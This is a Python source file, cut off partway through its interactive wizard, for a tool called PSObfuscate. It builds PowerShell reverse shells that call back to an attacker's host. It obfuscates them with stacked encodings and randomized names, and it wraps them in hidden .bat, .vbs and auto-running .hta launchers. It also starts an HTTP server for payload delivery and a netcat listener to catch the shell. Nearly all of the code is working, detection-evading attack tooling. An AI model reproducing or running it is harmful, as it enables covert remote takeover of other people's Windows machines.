#!/usr/bin/env python3
"""
PSObfuscate — PowerShell Payload Builder & Obfuscator
By https://github.com/01xmm · For authorized use only.
"""

import argparse
import atexit
import base64
import os
import random
import re
import socket
import string
import subprocess
import sys
from dataclasses import dataclass
from typing import List
from urllib.parse import quote

VERSION = '1.0'


# ══════════════════════════════════════════════════════════════════════════════
#  ANSI Colors
# ══════════════════════════════════════════════════════════════════════════════

def _detect_color():
    """Disable color when stdout is not a TTY (piped/redirected)."""
    return sys.stdout.isatty()

COLOR_ENABLED = _detect_color()

def _c(code):
    return code if COLOR_ENABLED else ''

R  = _c('\033[91m')
C  = _c('\033[96m')
G  = _c('\033[92m')
Y  = _c('\033[93m')
DM = _c('\033[2m')
W  = _c('\033[97m')
RS = _c('\033[0m')

def _reload_colors(enabled):
    global R, C, G, Y, DM, W, RS, COLOR_ENABLED
    COLOR_ENABLED = enabled
    R  = _c('\033[91m'); C  = _c('\033[96m'); G  = _c('\033[92m')
    Y  = _c('\033[93m'); DM = _c('\033[2m');  W  = _c('\033[97m')
    RS = _c('\033[0m')
    _rebuild_globals()

def _rebuild_globals():
    global BANNER, SEP
    BANNER = f"""
{R}PSObfuscate{RS}
{DM}\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{RS}
{W}PowerShell Payload Builder & Obfuscator{RS}
{DM}v{VERSION} \u00b7 By: https://github.com/01xmm {RS}

{DM}Build, encode, wrap, and deliver PowerShell payloads.{RS}
{DM}For authorized use only.{RS}
"""
    SEP = f"{DM}\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{RS}"

_rebuild_globals()


# ══════════════════════════════════════════════════════════════════════════════
#  Constants & Labels
# ══════════════════════════════════════════════════════════════════════════════

TRANSFORM_LABELS = {
    'N': 'None',
    '1': 'Base64',
    '2': 'Hex',
    '3': 'ASCII',
    '4': 'URL Encode',
    '5': 'Binary',
    '6': 'Reverse',
    'A': 'Advanced',
}

TRANSFORM_SHORT = {
    'N': 'No transform, raw script',
    '1': 'Base64 wrapper with IEX runtime decode',
    '2': 'Hex wrapper with IEX runtime decode',
    '3': 'ASCII char array with IEX runtime decode',
    '4': 'URL-encoded wrapper with IEX runtime decode',
    '5': 'Binary wrapper with IEX runtime decode',
    '6': 'Reverse string with runtime rebuild',
    'A': 'Structural rewrite with randomized names and noise - Inspired by I-Am-Jakoby',
}

WRAPPER_RAW     = 'raw'
WRAPPER_ENCODED = 'encoded'
WRAPPER_BAT     = 'bat'
WRAPPER_VBS     = 'vbs'
WRAPPER_HTA     = 'hta'

WRAPPER_MENU = [
    ('1', WRAPPER_RAW,     'Raw script',       '.ps1 \u2014 plain PowerShell'),
    ('2', WRAPPER_ENCODED, 'Encoded launcher',  'powershell -enc one-liner'),
    ('3', WRAPPER_BAT,     'CMD launcher',      '.bat \u2014 cmd.exe -> Powershell.exe'),
    ('4', WRAPPER_VBS,     'VBS launcher',      '.vbs \u2014 Windows Script Host'),
    ('5', WRAPPER_HTA,     'HTA launcher',      '.hta \u2014 HTML Application'),
]

WRAPPER_LABELS = {key: label for _, key, label, _ in WRAPPER_MENU}

WRAPPER_EXTENSIONS = {
    WRAPPER_RAW:     '.ps1',
    WRAPPER_ENCODED: '.txt',
    WRAPPER_BAT:     '.bat',
    WRAPPER_VBS:     '.vbs',
    WRAPPER_HTA:     '.hta',
}

WRAPPER_BY_KEY = {num: wtype for num, wtype, _, _ in WRAPPER_MENU}

VALID_TRANSFORM_KEYS = {'N', '1', '2', '3', '4', '5', '6', 'A'}


# ══════════════════════════════════════════════════════════════════════════════
#  Build Result
# ══════════════════════════════════════════════════════════════════════════════

SOURCE_BUILTIN = 'builtin'
SOURCE_FILE    = 'file'

@dataclass
class BuildResult:
    source: str
    transforms: List[str]
    wrapper: str
    raw_payload: str
    rendered: str
    lhost: str = ''
    lport: int = 0
    source_file: str = ''

    @property
    def transform_label(self):
        return ' \u2192 '.join(TRANSFORM_LABELS[c] for c in self.transforms)

    @property
    def wrapper_label(self):
        return WRAPPER_LABELS[self.wrapper]

    @property
    def line_count(self):
        return self.rendered.count('\n') + 1

    @property
    def char_count(self):
        return len(self.rendered)


# ══════════════════════════════════════════════════════════════════════════════
#  Network Detection
# ══════════════════════════════════════════════════════════════════════════════

def get_interfaces():
    """Return list of (name, ip) tuples for active network interfaces."""
    ifaces = []
    try:
        out = subprocess.check_output(
            ['ip', '-4', '-o', 'addr', 'show'],
            stderr=subprocess.DEVNULL, text=True
        )
        for line in out.strip().splitlines():
            parts = line.split()
            name = parts[1]
            ip = parts[3].split('/')[0]
            if ip != '127.0.0.1':
                ifaces.append((name, ip))
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass

    if not ifaces:
        try:
            out = subprocess.check_output(
                ['ifconfig'],
                stderr=subprocess.DEVNULL, text=True
            )
            current_iface = None
            for line in out.splitlines():
                if line and not line[0].isspace():
                    current_iface = line.split(':')[0].split()[0]
                elif 'inet ' in line and current_iface:
                    ip = line.strip().split()[1]
                    if ip != '127.0.0.1':
                        ifaces.append((current_iface, ip))
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass

    if not ifaces:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            ifaces.append(('default', ip))
        except Exception:
            pass

    return ifaces


# ══════════════════════════════════════════════════════════════════════════════
#  Validation
# ══════════════════════════════════════════════════════════════════════════════

def is_valid_ip(val):
    """Check if a string is a valid IPv4 address."""
    parts = val.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            n = int(part)
            if n < 0 or n > 255:
                return False
            if part != str(n):
                return False
        except ValueError:
            return False
    return True


def is_valid_hostname(val):
    """Check if a string looks like a plausible hostname or domain."""
    if not val or len(val) > 253:
        return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?'
        r'(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$', val
    ))


def is_valid_target(val):
    return is_valid_ip(val) or is_valid_hostname(val)


def sanitize_for_ps(val):
    """Escape characters that could break a PowerShell double-quoted string."""
    val = val.replace('`', '``')
    val = val.replace('"', '`"')
    val = val.replace('$', '`$')
    return val


# ══════════════════════════════════════════════════════════════════════════════
#  Variable & Encoding Helpers
# ══════════════════════════════════════════════════════════════════════════════

def rand_var(existing=None):
    """Generate a unique random PowerShell variable name."""
    if existing is None:
        existing = set()
    chars = string.ascii_letters + string.digits
    for _ in range(1000):
        r = random.random()
        if r < 0.12:
            length = 2
        elif r < 0.20:
            length = 3
        else:
            length = random.randint(5, 22)
        name = random.choice(string.ascii_letters) + ''.join(random.choices(chars, k=length - 1))
        var = '$' + name
        if var not in existing:
            existing.add(var)
            return var
    var = '$_v' + ''.join(random.choices(chars, k=20))
    existing.add(var)
    return var


def rand_comment():
    """Generate a random PowerShell inline comment block for pipeline noise."""
    styles = [
        lambda: '<#' + ''.join(random.choices(string.ascii_letters, k=random.randint(1, 8))) + '#>',
        lambda: '<# #>',
        lambda: '<#' + ''.join(random.choices(' ._-', k=random.randint(1, 4))) + '#>',
        lambda: '<#' + str(random.randint(0, 9999)) + '#>',
    ]
    return random.choice(styles)()


def to_ascii(s):
    return ','.join(str(ord(c)) for c in s)


def enc(s):
    arr = to_ascii(s)
    c1, c2, c3 = rand_comment(), rand_comment(), rand_comment()
    return (
        "([string]::join('', ( ("
        + arr
        + f") |{c1}%{{$_}}{c2}|%{{ ( [char][int] $_)}})) |{c3}%{{$_}}| % {{$_}})"
    )


def enc_arith(s):
    parts = []
    for c in s:
        n = ord(c)
        a = random.randint(1, 120)
        if random.random() < 0.5:
            parts.append(f'[char]({a}+{n}-{a})')
        else:
            parts.append(f'[char]({a}*{n}/{a})')
    return '$(' + '+'.join(parts) + ')'


# ══════════════════════════════════════════════════════════════════════════════
#  Core Payload Generators
# ══════════════════════════════════════════════════════════════════════════════

def generate_clean(ip, port):
    safe_ip = sanitize_for_ps(ip)
    return (
        f'$c=New-Object System.Net.Sockets.TCPClient("{safe_ip}",{port});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{'
        f'$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'$r=(Invoke-Expression $d 2>&1|Out-String);'
        f"$p=$r+'PS '+(Get-Location).Path+'> ';"
        f'$w=([text.encoding]::ASCII).GetBytes($p);'
        f'$s.Write($w,0,$w.Length);$s.Flush()'
        f'}};$c.Close();'
    )


def generate_advanced(ip, port):
    safe_ip = sanitize_for_ps(ip)
    used = set()
    vc = rand_var(used); vs = rand_var(used); vb = rand_var(used); vr = rand_var(used)
    vd = rand_var(used); ve = rand_var(used); vp = rand_var(used); vw = rand_var(used)

    new_obj   = enc("New-Object")
    ascii_enc = enc("System.Text.ASCIIEncoding")
    inv_expr  = enc("Invoke-Expression")
    out_str   = enc("Out-String")
    get_loc   = enc("Get-Location")
    tcp_cl    = enc_arith("System.Net.Sockets.TCPClient")

    c1, c2 = rand_comment(), rand_comment()

    lines = []
    lines.append(vc + ' = & ' + new_obj + ' ' + tcp_cl + '("' + safe_ip + '", "' + str(port) + '");')
    lines.append(vs + ' = $(' + vc + f'.GetStream());[byte[]]{vb} = 0..(65535)|{c1}%{{$_}}{c2}|%{{0}};')
    lines.append('while((' + vr + ' = ' + vs + '.Read(' + vb + ', 0, ' + vb + '.Length)) -ne 0){')
    lines.append('    ' + vd + ' = (& ' + new_obj + ' -TypeName ' + ascii_enc + ').GetString(' + vb + ',0, ' + vr + ');')
    c3, c4 = rand_comment(), rand_comment()
    lines.append('    ' + ve + ' = (& ' + inv_expr + ' ' + vd + f' 2>&1 |{c3}%{{$_}}{c4}| & ' + out_str + ' );')
    lines.append("    " + vp + " = " + ve + " + 'PS ' + (& " + get_loc + ").Path + '> ';")
    lines.append('    ' + vw + ' = ([text.encoding]::ASCII).GetBytes(' + vp + ');')
    lines.append('    ' + vs + '.Write(' + vw + ',0,' + vw + '.Length);')
    lines.append('    ($(' + vs + '.Flush()))')
    lines.append('};')
    lines.append('$($((' + vc + '.Close())));')
    return '\n'.join(lines)


# ══════════════════════════════════════════════════════════════════════════════
#  Transformation Layers
# ══════════════════════════════════════════════════════════════════════════════

def layer_base64(script):
    b64 = base64.b64encode(script.encode('utf-16-le')).decode()
    return f"IEX([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}')))"


def layer_hex(script):
    hex_str = ''.join(f'{ord(c):02x}' for c in script)
    return (
        f"$_h='{hex_str}';"
        f"IEX(-join($_h -split '(..)'|?{{$_}}|%{{[char][convert]::ToInt32($_,16)}}))"
    )


def layer_ascii(script):
    vals = ','.join(str(ord(c)) for c in script)
    return f"IEX([string]::join('',(({vals})|%{{[char][int]$_}})))"


def layer_url(script):
    return f"IEX([uri]::UnescapeDataString('{quote(script, safe='')}'))"


def layer_binary(script):
    bins = ' '.join(f'{ord(c):08b}' for c in script)
    return (
        f"$_b='{bins}'.split();"
        f"IEX(-join($_b|%{{[char][convert]::ToInt32($_,2)}}))"
    )


def layer_reverse(script):
    rev = script[::-1]
    n = len(rev)
    return f"IEX('{rev.replace(chr(39), chr(39)+chr(39))}'[-1..-{n}]-join'')"


LAYER_MAP = {
    '1': layer_base64,
    '2': layer_hex,
    '3': layer_ascii,
    '4': layer_url,
    '5': layer_binary,
    '6': layer_reverse,
}


# ══════════════════════════════════════════════════════════════════════════════
#  Execution Wrappers
# ══════════════════════════════════════════════════════════════════════════════

def _encode_launcher(payload):
    """Encode a PowerShell script into a powershell.exe -enc one-liner."""
    b64 = base64.b64encode(payload.encode('utf-16-le')).decode()
    return f"powershell -NoP -sta -NonI -W Hidden -enc {b64}"


def wrap_raw(payload):
    return payload


def wrap_encoded(payload):
    return _encode_launcher(payload)


def wrap_bat(payload):
    cmd = _encode_launcher(payload)
    return f"@echo off\n{cmd}\n"


def _vbs_cmd_builder(cmd, indent=''):
    """Build VBS string concatenation for a long command, handling line limits."""
    chunk_size = 200
    lines = [f'{indent}cmd = ""']
    for i in range(0, len(cmd), chunk_size):
        chunk = cmd[i:i + chunk_size]
        lines.append(f'{indent}cmd = cmd & "{chunk}"')
    return '\n'.join(lines)


def wrap_vbs(payload):
    cmd = _encode_launcher(payload)
    vbs_cmd = _vbs_cmd_builder(cmd)
    return (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'{vbs_cmd}\n'
        f'objShell.Run cmd, 0, False\n'
    )


def wrap_hta(payload):
    cmd = _encode_launcher(payload)
    vbs_cmd = _vbs_cmd_builder(cmd, indent='    ')
    return (
        '<html>\n'
        '<head>\n'
        '<script language="VBScript">\n'
        'Sub Window_OnLoad\n'
        '    Set objShell = CreateObject("WScript.Shell")\n'
        f'{vbs_cmd}\n'
        '    objShell.Run cmd, 0, False\n'
        '    Close\n'
        'End Sub\n'
        '</script>\n'
        '</head>\n'
        '<body></body>\n'
        '</html>\n'
    )


WRAPPER_MAP = {
    WRAPPER_RAW:     wrap_raw,
    WRAPPER_ENCODED: wrap_encoded,
    WRAPPER_BAT:     wrap_bat,
    WRAPPER_VBS:     wrap_vbs,
    WRAPPER_HTA:     wrap_hta,
}


# ══════════════════════════════════════════════════════════════════════════════
#  Build Pipeline
# ══════════════════════════════════════════════════════════════════════════════

def build(lhost, lport, transforms, wrapper=WRAPPER_RAW,
          custom_payload=None, source_file=''):
    """Generate the payload, apply transforms, wrap, and return a BuildResult."""
    if custom_payload is not None:
        raw = custom_payload
        source = SOURCE_FILE
    elif transforms == ['A']:
        raw = generate_advanced(lhost, lport)
        source = SOURCE_BUILTIN
    else:
        raw = generate_clean(lhost, lport)
        source = SOURCE_BUILTIN

    if transforms != ['A']:
        for t in transforms:
            if t != 'N':
                raw = LAYER_MAP[t](raw)

    rendered = WRAPPER_MAP[wrapper](raw)

    return BuildResult(
        source=source,
        lhost=lhost,
        lport=lport,
        transforms=transforms,
        wrapper=wrapper,
        raw_payload=raw,
        rendered=rendered,
        source_file=source_file,
    )


# ══════════════════════════════════════════════════════════════════════════════
#  UI Helpers
# ══════════════════════════════════════════════════════════════════════════════

def clear_screen():
    """Clear terminal and move cursor to top."""
    if sys.stdout.isatty():
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()


def config_bar(source=None, source_file='', lhost=None, lport=None, transforms=None):
    """Print tool identity + 1-line config summary + separator."""
    print(f"{R}PSObfuscate{RS}")
    parts = []
    if source == SOURCE_BUILTIN:
        parts.append(f'{DM}Source:{RS} {C}Built-in{RS}')
        parts.append(f'{DM}LHOST:{RS} {C}{lhost or "\u2014"}{RS}')
        parts.append(f'{DM}LPORT:{RS} {C}{lport or "\u2014"}{RS}')
    elif source == SOURCE_FILE:
        sf = os.path.basename(source_file) if source_file else 'File'
        parts.append(f'{DM}Source:{RS} {C}{sf}{RS}')
    if transforms:
        label = ' \u2192 '.join(TRANSFORM_LABELS[c] for c in transforms)
        parts.append(f'{DM}Encoding:{RS} {C}{label}{RS}')
    elif source is not None:
        parts.append(f'{DM}Encoding:{RS} {C}\u2014{RS}')
    if parts:
        print('  \u00b7  '.join(parts))
    print(SEP)


def ask(label, hint=''):
    if hint:
        prompt_label = f"{label} [{hint}]"
    else:
        prompt_label = label
    return input(f"{C}{prompt_label}{RS} {W}\u203a{RS} ").strip()


def step(n, total, title):
    full = f"[{n}/{total}] {title}"
    underline = '\u2500' * len(full)
    print(f"\n{W}{full}{RS}")
    print(f"{DM}{underline}{RS}")

def section(title):
    """Print a section heading with underline."""
    print(f"\n{W}{title}{RS}")
    print(f"{DM}{'\u2500' * len(title)}{RS}")


def show_menu(items):
    """Render a vertical menu.

    items: list of tuples. Supported formats:
      (key, label)
      (key, label, description)
      (key, label, description, tag)
    """
    for item in items:
        key, label = item[0], item[1]
        desc = item[2] if len(item) > 2 else ''
        tag = item[3] if len(item) > 3 else ''
        line = f"{C}[{key}]{RS} {W}{label}{RS}"
        if desc:
            line += f"  {DM}{desc}{RS}"
        if tag:
            line += f"  {DM}{tag}{RS}"
        print(line)


_ANSI_RE = re.compile(r'\033\[[0-9;]*m')
_BOX_W = 58

def _vlen(s):
    """Visible length of a string (ignoring ANSI escape codes)."""
    return len(_ANSI_RE.sub('', s))

def _box_top():
    return f"{DM}\u250c{'\u2500' * (_BOX_W + 2)}\u2510{RS}"

def _box_mid():
    return f"{DM}\u251c{'\u2500' * (_BOX_W + 2)}\u2524{RS}"

def _box_bot():
    return f"{DM}\u2514{'\u2500' * (_BOX_W + 2)}\u2518{RS}"

def _box_row(content=''):
    """Render a single box row with content padded to _BOX_W visible chars."""
    pad = max(0, _BOX_W - _vlen(content))
    return f"{DM}\u2502{RS} {content}{' ' * pad} {DM}\u2502{RS}"


def _copy_to_clipboard(text):
    """Copy text to system clipboard; return True on success."""
    for cmd in (['pbcopy'], ['xclip', '-selection', 'clipboard'], ['xsel', '--clipboard', '--input']):
        try:
            proc = subprocess.run(cmd, input=text.encode(), stderr=subprocess.DEVNULL)
            if proc.returncode == 0:
                return True
        except FileNotFoundError:
            continue
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  Listeners
# ══════════════════════════════════════════════════════════════════════════════

_http_proc = None   # (proc, port) or None
_http_port = None


def _cleanup_listeners():
    """Terminate background HTTP server on exit."""
    global _http_proc
    if _http_proc is not None:
        try:
            _http_proc.terminate()
            _http_proc.wait(timeout=2)
        except Exception:
            try:
                _http_proc.kill()
            except Exception:
                pass

atexit.register(_cleanup_listeners)


def _port_in_use(port):
    """Check if a TCP port is already bound."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('', port))
        return False
    except OSError:
        return True
    finally:
        s.close()


def _find_netcat():
    """Return the first available netcat binary, or None."""
    for name in ('ncat', 'nc', 'netcat'):
        try:
            subprocess.run([name, '--help'], stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=2)
            return name
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def _http_is_running():
    """Check if the HTTP server process is still alive."""
    global _http_proc
    if _http_proc is None:
        return False
    if _http_proc.poll() is not None:
        _http_proc = None
        return False
    return True


def _start_http_server(port, lhost='', filename=''):
    """Start python3 -m http.server in the background."""
    global _http_proc, _http_port
    if _http_is_running():
        print(f"\n{Y}[!]{RS} HTTP server already running on port {W}{_http_port}{RS}  {DM}(PID {_http_proc.pid}){RS}")
        return
    if _port_in_use(port):
        print(f"\n{R}[!]{RS} Port {W}{port}{RS} is already in use.")
        return
    try:
        proc = subprocess.Popen(
            [sys.executable, '-m', 'http.server', str(port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        _http_proc = proc
        _http_port = port
        host_display = lhost or '<LHOST>'
        fname = filename or '<file>'
        print(f"\n{G}\u2714{RS} HTTP server started  {DM}:{port}{RS}")
        print(f"  {DM}Fetch:{RS}  {C}iwr http://{host_display}:{port}/{fname} -OutFile {fname}{RS}")
    except OSError as e:
        print(f"\n{R}[!]{RS} Could not start HTTP server: {e}")


def _stop_http_server():
    """Stop the background HTTP server."""
    global _http_proc, _http_port
    if not _http_is_running():
        print(f"\n{DM}No HTTP server running.{RS}")
        return
    port = _http_port
    try:
        _http_proc.terminate()
        _http_proc.wait(timeout=3)
    except Exception:
        try:
            _http_proc.kill()
        except Exception:
            pass
    _http_proc = None
    _http_port = None
    print(f"\n{G}\u2714{RS} HTTP server stopped  {DM}:{port}{RS}")


def _run_netcat_foreground(port):
    """Run netcat listener in the foreground \u2014 blocks until the user exits."""
    nc = _find_netcat()
    if nc is None:
        print(f"\n{R}[!]{RS} No netcat found {DM}(install nc / ncat / netcat){RS}")
        return
    if _port_in_use(port):
        print(f"\n{R}[!]{RS} Port {W}{port}{RS} is already in use.")
        return
    print(f"\n{G}\u2714{RS} Starting {W}{nc} -lvnp {port}{RS}")
    print(f"  {DM}Ctrl+C to return to PSObfuscate{RS}")
    print()
    try:
        subprocess.run([nc, '-lvnp', str(port)])
    except KeyboardInterrupt:
        pass


def _prompt_port(default):
    """Prompt for a port number with a default. Returns int or None to cancel."""
    while True:
        val = ask(f"Port", f"default: {default}, 0: Cancel")
        if val == '0':
            return None
        if not val:
            return default
        try:
            port = int(val)
            if 1 <= port <= 65535:
                return port
        except ValueError:
            pass
        print(f"{R}[!]{RS} Must be 1\u201365535.")


def _start_listeners(default_lport, lhost='', filename=''):
    """Submenu for starting HTTP server or netcat listener."""
    http_running = _http_is_running()

    items = []
    if http_running:
        items.append(('1', 'HTTP server', f'already running :{_http_port}'))
    else:
        items.append(('1', 'HTTP server', 'python3 -m http.server (background)'))
    items.append(('2', 'Netcat listener', 'catch reverse shell (foreground)'))
    if not http_running:
        items.append(('3', 'Both', 'HTTP background, then netcat foreground'))
    items.append(('0', 'Back'))

    section('Start Listener')
    show_menu(items)

    max_opt = '2' if http_running else '3'

    while True:
        sel = ask("Selection", "0: Back")

        if sel == '0' or not sel:
            return

        if sel == '1':
            if http_running:
                print(f"\n{Y}[!]{RS} HTTP server already running on port {W}{_http_port}{RS}")
                return
            port = _prompt_port(8080)
            if port is not None:
                _start_http_server(port, lhost, filename=filename)
            return

        if sel == '2':
            port = _prompt_port(default_lport or 4444)
            if port is not None:
                _run_netcat_foreground(port)
            return

        if sel == '3' and not http_running:
            http_port = _prompt_port(8080)
            if http_port is None:
                return
            _start_http_server(http_port, lhost, filename=filename)
            nc_port = _prompt_port(default_lport or 4444)
            if nc_port is None:
                return
            _run_netcat_foreground(nc_port)
            return

        print(f"{R}[!]{RS} Choose 0\u2013{max_opt}.")


def _stop_listeners():
    """Submenu for stopping running listeners."""
    if not _http_is_running():
        print(f"\n{DM}No listeners running.{RS}")
        return
    print(f"\n{DM}Running:{RS}  HTTP :{_http_port}")
    print()
    show_menu([
        ('1', 'Stop HTTP server'),
        ('0', 'Back'),
    ])
    while True:
        sel = ask("Selection", "0: Back")
        if sel == '0' or not sel:
            return
        if sel == '1':
            _stop_http_server()
            return
        print(f"{R}[!]{RS} Choose 0 or 1.")


# ══════════════════════════════════════════════════════════════════════════════
#  Interactive Flow — Collection Stages
# ══════════════════════════════════════════════════════════════════════════════

def collect_payload_source():
    """Choose between built-in template or custom payload file.
    Clears screen and shows banner (first screen)."""
    clear_screen()
    print(BANNER)
    section('Payload Source')
    show_menu([
        ('1', 'Built-in reverse shell', '', 'default'),
        ('2', 'Load from file'),
    ])

    while True:
        val = ask("Selection", "default: 1")

        if val in ('', '1'):
            return SOURCE_BUILTIN

        if val == '2':
            return SOURCE_FILE

        if val:
            print(f"{R}[!]{RS} Choose 1 or 2.")


def collect_input_file(step_n, total, *, source=None, source_file='', transforms=None):
    """Collect the input file path as a dedicated wizard step."""
    clear_screen()
    config_bar(source=source, source_file=source_file, transforms=transforms)
    step(step_n, total, 'Input File')
    return _prompt_input_file()


def _prompt_callback_address(allow_cancel=False):
    """Core address prompting logic. Returns address string, or None if cancelled."""
    ifaces = get_interfaces()
    if ifaces:
        items = []
        for idx, (name, ip) in enumerate(ifaces):
            tag = 'default' if idx == 0 else ''
            items.append((str(idx + 1), f"{ip:<18}", name, tag))
        section('Available interfaces')
        show_menu(items)

    default_ip = ifaces[0][1] if ifaces else None
    hint_parts = []
    if default_ip:
        hint_parts.append(f"default: {default_ip}")
    if allow_cancel:
        hint_parts.append("0: Reset")
    hint = ', '.join(hint_parts)

    blank_count = 0
    while True:
        val = ask("LHOST", hint) if hint else ask("LHOST")

        if val == '0' and allow_cancel:
            return None

        if not val and default_ip:
            return default_ip

        if val.isdigit() and ifaces:
            idx = int(val) - 1
            if 0 <= idx < len(ifaces):
                name, ip = ifaces[idx]
                return ip
            print(f"{R}[!]{RS} Choose 1\u2013{len(ifaces)}, or enter an IP/hostname.")
            continue

        if val:
            if is_valid_target(val):
                return val
            print(f"{R}[!]{RS} Invalid IP or hostname.")
            continue

        if not default_ip:
            blank_count += 1
            if blank_count == 1:
                print(f"{DM}Enter an IP address or hostname.{RS}")
            continue


def _prompt_callback_port(allow_cancel=False):
    """Core port prompting logic. Returns port int, or None if cancelled."""
    hint_parts = ["default: 4444"]
    if allow_cancel:
        hint_parts.append("0: Reset")
    hint = ', '.join(hint_parts)

    while True:
        val = ask("LPORT", hint)
        if not val:
            return 4444
        if val == '0' and allow_cancel:
            return None
        try:
            port = int(val)
            if 1 <= port <= 65535:
                return port
        except ValueError:
            pass
        print(f"{R}[!]{RS} Must be 1\u201365535.")


def _prompt_transformation(allow_advanced=True, screen_redraw=None):
    """Core transformation prompting logic. Returns list of transform keys.

    screen_redraw: optional callable to clear+redraw the screen header
    when user types '?' for expanded help.
    """
    items = [('N', 'None')]
    for key in ['1', '2', '3', '4', '5', '6']:
        items.append((key, TRANSFORM_LABELS[key]))
    if allow_advanced:
        items.append(('A', 'Advanced'))
    print()
    show_menu(items)
    print(f"\n{DM}Stack with commas (e.g. 6,1). Type ? for details.{RS}")

    if not allow_advanced:
        print(f"{DM}Advanced is only available with the built-in payload.{RS}")

    default_key = 'N'

    while True:
        raw = ask("Encoding", f"default: {default_key}").upper().replace(' ', '')

        if raw == '?':
            if screen_redraw:
                screen_redraw()
            else:
                print()
            print(f"{DM}Layers 1\u20136 are reversible encoding wrappers (IEX self-decode).{RS}")
            if allow_advanced:
                print(f"{DM}Advanced (A) rewrites the payload with randomized names and noise.{RS}")
            print(f"{DM}Stack layers with commas, applied left to right (e.g. 6,1).{RS}")
            print()
            expanded = [('N', f"{'None':<16}", TRANSFORM_SHORT['N'])]
            for key in ['1', '2', '3', '4', '5', '6']:
                expanded.append((key, f"{TRANSFORM_LABELS[key]:<16}", TRANSFORM_SHORT[key]))
            if allow_advanced:
                expanded.append(('A', f"{'Advanced':<16}", TRANSFORM_SHORT['A']))
            print()
            show_menu(expanded)
            continue

        if not raw:
            return [default_key]

        tokens = [t.strip() for t in raw.split(',') if t.strip()]

        if 'N' in tokens:
            if len(tokens) > 1:
                print(f"{Y}[!]{RS} None is standalone \u2014 ignoring other selections.")
            return ['N']

        if 'A' in tokens:
            if not allow_advanced:
                print(f"{Y}[!]{RS} Advanced is only available with the built-in payload.")
                continue
            if len(tokens) > 1:
                print(f"{Y}[!]{RS} Advanced is standalone \u2014 ignoring other selections.")
            return ['A']

        valid   = [t for t in tokens if t in LAYER_MAP]
        invalid = [t for t in tokens if t not in VALID_TRANSFORM_KEYS]

        if invalid:
            print(f"{Y}[!]{RS} Unknown: {', '.join(invalid)}  {DM}(ignored){RS}")

        if valid:
            return valid

        choices = "N, 1\u20136, or A" if allow_advanced else "N or 1\u20136"
        print(f"{R}[!]{RS} Choose {choices}.")


def _prompt_input_file():
    """Prompt for a PowerShell script file. Returns (content, filepath) or None to go back."""
    blank_count = 0
    while True:
        fpath = ask("Path to .ps1 file", "0: Back")
        if fpath == '0':
            return None
        if not fpath:
            blank_count += 1
            if blank_count == 1:
                print(f"{DM}Enter a file path, 0: Back.{RS}")
            continue
        blank_count = 0
        fpath = os.path.expanduser(fpath)
        if not os.path.isfile(fpath):
            print(f"{R}[!]{RS} File not found: {W}{fpath}{RS}")
            continue
        try:
            with open(fpath, 'r') as f:
                content = f.read()
        except OSError as e:
            print(f"{R}[!]{RS} Cannot read file: {e}")
            continue
        if not content.strip():
            print(f"{R}[!]{RS} File is empty.")
            continue
        abspath = os.path.abspath(fpath)
        print(f"\n{G}\u2714{RS} Loaded: {W}{abspath}{RS}")
        return content, fpath


def collect_callback_address(step_n, total, allow_cancel=False, *,
                             source=None, lhost=None, lport=None, transforms=None):
    """Collect the callback target address. Returns address or None if cancelled."""
    clear_screen()
    config_bar(source=source, lhost=lhost, lport=lport, transforms=transforms)
    step(step_n, total, 'Callback Host')
    return _prompt_callback_address(allow_cancel=allow_cancel)


def collect_callback_port(step_n, total, allow_cancel=False, *,
                          source=None, lhost=None, lport=None, transforms=None):
    """Collect the LPORT. Returns port or None if cancelled."""
    clear_screen()
    config_bar(source=source, lhost=lhost, lport=lport, transforms=transforms)
    step(step_n, total, 'Callback Port')
    return _prompt_callback_port(allow_cancel=allow_cancel)


def collect_encoding(step_n, total, allow_advanced=True, *,
                     source=None, source_file='', lhost=None, lport=None, transforms=None):
    """Collect the encoding layer selection."""
    def redraw():
        clear_screen()
        config_bar(source=source, source_file=source_file,
                   lhost=lhost, lport=lport, transforms=transforms)
        step(step_n, total, 'Encoding')

    clear_screen()
    config_bar(source=source, source_file=source_file,
               lhost=lhost, lport=lport, transforms=transforms)
    step(step_n, total, 'Encoding')
    return _prompt_transformation(allow_advanced, screen_redraw=redraw)


# ══════════════════════════════════════════════════════════════════════════════
#  Post-Build UX
# ══════════════════════════════════════════════════════════════════════════════

def review_build(source, lhost, lport, transforms, source_file, custom_payload):
    """Review screen with Build/Edit/Start over options.

    Returns (lhost, lport, transforms, source_file, custom_payload) to build,
    or None to restart the wizard.
    """
    while True:
        clear_screen()
        config_bar(source=source, source_file=source_file,
                   lhost=lhost, lport=lport, transforms=transforms)

        enc_label = ' \u2192 '.join(TRANSFORM_LABELS[c] for c in transforms)

        print(f"\n{_box_top()}")
        print(_box_row(f" {W}Review{RS}"))
        print(_box_mid())
        if source == SOURCE_BUILTIN:
